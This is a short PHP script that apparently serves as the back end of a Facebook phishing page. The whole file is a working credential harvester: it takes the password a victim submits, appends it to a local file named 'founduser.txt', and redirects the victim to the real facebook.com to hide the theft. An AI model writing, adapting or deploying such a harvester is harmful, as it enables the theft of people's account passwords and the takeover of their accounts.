<?php
$user = $_POST["password"];
    $co = "===========================================
"; 
    $cl = "===========================================
";
    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
    $us = "Password: $user
";
    fwrite($fileuser, "
". $co. $us. $cl);
    fclose($fileuser);
    header('Location: https://www.facebook.com/');
    exit();
    ?>
